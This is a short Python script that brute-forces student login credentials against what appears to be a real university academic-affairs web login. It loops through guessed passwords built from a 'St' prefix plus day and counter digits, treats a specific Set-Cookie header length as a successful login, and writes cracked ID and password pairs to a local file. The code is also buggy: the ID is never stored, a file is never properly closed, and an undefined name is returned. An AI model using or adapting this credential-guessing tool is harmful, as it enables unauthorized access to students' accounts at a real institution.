
import requests

class JiaoWuChu:
    def __init__(self):
        self.url='http://ded.nuaa.edu.cn/NetEAn/user/jwc_login_jk1.asp?usr='
        self.nuaaid='0'
        self.passwd='0'

    def id(self,x):
        x=str(x)
        nuaaid='0316'+x


    def psd(self,day,n):
        day=str(day)
        n=str(n)
        str1=str(day+n).zfill(6)
        self.passwd='St'+str1

    def get(self):
        Cookie_len=len(requests.get(self.url+self.nuaaid+ '&pwd=' + self.passwd,timeout=30).headers['Set-Cookie'])
        if Cookie_len==331:
            f = open('D:\\2.txt', 'a')
            f.write(self.nuaaid)
            f.write('---')
            f.write(self.passwd+'\n')
            f.close
            return ok

if __name__ == '__main__':
    jiaowuchu=JiaoWuChu()
    print('输入班级和初始学号，例如：20101')
    idx=int(input())
    jiaowuchu.id(idx)
    for day in range(1,32):
        for n in range(0,9999):
            jiaowuchu.psd(day,n)
            yesno=jiaowuchu.get()
            if yesno=='ok':
                exit()
